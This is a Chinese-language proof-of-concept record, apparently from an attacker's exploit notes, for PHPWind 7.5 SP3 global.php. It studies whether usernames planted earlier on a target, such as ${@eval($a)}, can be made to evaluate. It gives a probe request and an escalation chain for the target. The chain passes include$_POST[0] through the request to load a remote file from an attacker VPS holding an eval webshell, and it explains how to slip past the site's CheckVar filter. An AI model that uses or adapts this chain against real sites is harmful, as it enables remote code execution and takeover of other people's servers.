# PHPWind global.php InitGP(array('u','a')) 装载 $a 但被无条件 unset —— ${@eval($a)} 取不到值的判据

- **code**: phpwind-global.php-initgp-array-u-a-装载-a-但被无条件-unset-eval-a-取不到值的判据
- **kind**: poc
- **category**: rce
- **component**: PHPWind 7.5 SP3 global.php
- **versions**: 7.5 SP3（7.3.2 未验证）
- **severity**: high
- **language**: php
- **source**: self
- **verified_note**: 7.5 SP3 源码判定为“取不到值”。目标 7.3.2 的 global.php 该段（用户广告功能）是否存在/是否有 unset 未验证，需发上述 1 包判定。
- **path**: pocs/phpwind-global.php-initgp-array-u-a-装载-a-但被无条件-unset-eval-a-取不到值的判据/poc.php
- **tags**: phpwind,InitGP,register_globals,变量注入,死payload判据
- **created_at**: 2026-10-06T11:37:16.166Z

## 描述

目标上已存在前人注册的用户名 ${@eval($a)}(uid=8916) 与 ${@eval($_)} (uid=8913)，11/8 字节，恰在 username 12 字节上限内。要让它们在 bank_sort.php 的 "${expr}" 里求值，需要 $a 或 $_ 是裸全局变量。InitGP()（require/common.php:605-620）确实把 $_GET[$key]/$_POST[$key] 写进 $GLOBALS[$key]，且 global.php:233 有 InitGP(array('u','a'))。但 global.php:241 在同一层作用域无条件执行 unset($u,$a,$cookie_userads)，且该 InitGP 的触发条件极苛刻（$db_ads 为真、!$windid 未登录、strlen($_GET['a'])<16、Referer 不含本站 Host）。$_ 从未被任何 InitGP 装载。故 7.5 SP3 上两者都取不到值 → 死 payload。

## 用法

```
1 个包即可判定目标（7.3.2）是否与 7.5 SP3 不同：
  GET /bbs/example.com?H_name=bank&a=echo%20123%3B HTTP/1.1
  Host: example.com
  Cookie: <登录 cookie>
  Referer: 留空或非本站
注意：a 的值里绝对不能出现右括号 )，否则 global.php:59-61 的 CheckVar 会把它替换成 &#41; 造成 PHP 语法错误。同理 = < .. 也会被转义。
判定：页面（bank 排行榜区域）出现 123 → $a 可控，RCE 成立；
      页面无 123 且无报错 → $a 被 unset 或从未装载，此路不通。
升级利用（若 123 出现且 allow_url_fopen=On）：
  GET /bbs/example.com?H_name=bank&a=include$_POST[0];
  POST 0=http://<VPS>/p.txt        （p.txt 内容：<?php eval($_POST[1]);?>）
  两个包，POST 字段名 0 的值不含 ) = < ，可穿过 CheckVar。
```

## 正文

```
// require/common.php:605-620 —— PHPWind 的“register_globals 等价物”
function InitGP($keys,$method=null,$cvtype=1){
	!is_array($keys) && $keys = array($keys);
	foreach ($keys as $key) {
		if ($key == 'GLOBALS') continue;
		$GLOBALS[$key] = NULL;
		if ($method != 'P' && isset($_GET[$key])) {
			$GLOBALS[$key] = $_GET[$key];          // ← 请求参数进裸全局变量
		} elseif ($method != 'G' && isset($_POST[$key])) {
			$GLOBALS[$key] = $_POST[$key];
		}
		if (isset($GLOBALS[$key]) && !empty($cvtype) || $cvtype==2) {
			$GLOBALS[$key] = Char_cv($GLOBALS[$key],$cvtype==2,true);   // 默认 cvtype=1 → Char_cv
		}
	}
}

// global.php:226-241 —— 唯一装载 'a' 的地方，且立刻 unset
if ($db_bbsifopen==2 && SCR!='login' && !defined('CK')) { ... }
if ($db_ifsafecv && !$safecv && !defined('PRO') && strpos($db_safegroup,",$groupid,") !== false ) {
	Showmsg('safecv_prompt');
}
232: if ($db_ads && !$windid && (is_numeric($_GET['u']) || ($_GET['a'] && strlen($_GET['a'])<16)) && strpos($pwServer['HTTP_REFERER'],$pwServer['HTTP_HOST'])===false) {
233:     InitGP(array('u','a'));
234:     Cookie('userads',"$u\t$a\t".md5($pwServer['HTTP_REFERER']));
235: } elseif ( $db_ads=='1' && ($cookie_userads = GetCookie('userads')) ) {
236:     list($u,$a) = explode("\t",$cookie_userads);
237:     if ((int)$u>0 || ($a && strlen($a)<16)) {
238:         require_once(R_P.'require/userads.php');
239:     }
240: }
241: unset($u,$a,$cookie_userads);   // ← 无论走哪个分支都执行，$a 被删

// 其它 InitGP(array('a',...)) 的位置（均属 apps/ 路由，不与 bank_sort.php 同作用域）：
// apps/ajax/example.com:6  apps/article/example.com:12  apps/photos/example.com:14
// apps/diary/example.com:14  apps/groups/action/m_groups.php:17  m_group.php:9
// apps/groups/action/m_galbum.php:12  apps/share/action/m_share.php:11
// 全站没有任何 InitGP 装载 '_'  → ${@eval($_)} 必死
```
